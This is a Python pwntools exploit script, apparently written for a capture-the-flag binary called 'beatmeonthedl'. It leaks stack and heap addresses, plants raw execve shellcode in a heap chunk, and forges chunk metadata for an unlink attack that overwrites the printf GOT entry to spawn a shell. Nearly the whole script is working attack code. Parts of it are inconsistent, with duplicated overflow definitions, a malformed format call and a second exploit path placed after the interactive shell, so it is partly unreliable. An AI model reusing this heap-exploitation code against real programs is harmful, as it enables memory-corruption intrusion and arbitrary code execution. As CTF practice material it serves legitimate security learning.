from pwn import *
import binascii

p = process("./beatmeonthedl")

context.log_level = 'debug'

shellcode = asm(shellcraft.sh())

gdb.attach(p, '''
set disassembly-flavor intel
set height 0
c
''')
# b *0x4010be

p.readuntil(":")
p.send("A"*16)
p.readuntil(": ")
leaked = p.readuntil(":")

start = leaked.find("A"*16)+16
print start, leaked
print len(leaked[start:])
stack_ptr = u64(leaked[start:leaked.find("\n", start+1)] + "\x00\x00")
print "Leaked stack address: 0x{:x}".format(stack_ptr)

def login():
    p.sendline('mcfly')
    p.readuntil(":")
    p.sendline('awesnap')

def add_request(data):
	p.readuntil("|")
	p.send("1")
	p.readuntil(">")
	p.send(str(data))


# def print_request():

# address of printf in got
got_addr = 0x609958

def delete_request(choice):
    p.readuntil("|")
    p.sendline("3")
    p.readuntil("choice: ")
    p.sendline(str(choice))

def change_request(choice, data):
    p.readuntil("|")
    p.sendline("4")

    p.readuntil("choice: ")
    p.sendline(str(choice))

    p.readuntil("data: ")
    p.sendline(data)



# Now, create overflow
#overflow first into second
overflow = "A"*56
# set size to zero, inuse bit to 1
overflow += p64(0x40)


overflow = 'h'* 0x30 + 'deadbeef' + p64(24, signed=True)

# FD->bk is +24 of chunk
# make this GOT address - 24
overflow += p64(got_addr - 24)

# this is BK. when unlink happens, this address is written to got_addr.
overflow += p64(0x400eb8)

def print_list():
    p.sendline('2')
    return p.recvuntil('| ')[:-2]



## Exploit -------------------
login()

# add_request('AAAA') #chunk 0
# add_request('AAAA') # chunk 1
# add_request('AAAA') # Chunk 2
# add_request('AAAA') # chunk 3
# add_request('AAAA') # chunk 4

shell_code = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
add_request('\xeb\x4e')
add_request('b' * 16 + shell_code + 'b' * (0x38 - 16 - len(shell_code)))
add_request('c' * 0x38)
add_request('d' * 0x38)
add_request('e' * 0x38)

delete_request(1)
delete_request(3)
change_request(2, 'f'* 0x38 + 'f' * 8)

p.readuntil("|")
p.sendline("2")
heap_leak = p.readuntil("|")
print "heap leak", repr(heap_leak)


heap_addr = heap_leak.split('\n')[2]
print "heap addr", binascii.hexlify(repr(heap_addr))
print '[+] heap addr : 0x%x' % heap_addr

add_request('g' * 0x38)
change_request(1, 'h'* 0x30 + 'deadbeef' + p64(24, signed=True) + p64(0x609958 - 24)+ p64(heap_addr + 0x30))
p.interactive()

#First, we need to leak a heap address
# How to do? well, we can free a chunk in the middle of the four we just made
# the free chunk will contain fwd and back pointers to heap
# which we can print with option 2
#
# delete_request(2)
# delete_request(0)
#
# #overflow block in between
# change_request(1, 'Q'*71)
#
# p.readuntil("|")
# p.sendline("2")
# heap_leak = p.readuntil("|")
# print "heap leak", repr(heap_leak)
#
# heap_addr = heap_leak[heap_leak.rfind("Q") + 2: heap_leak.rfind("Q") + 5]
# print "heap addr", repr(heap_addr)

# stick shellcode in bss

change_request(0, overflow)

# Free first chunk, which also calls unlink on second chunk because it thinks second chunk is free too
delete_request(0)

# print_request()
# p.readuntil("|")
# p.sendline("1")
# call the shellcode!
p.interactive()
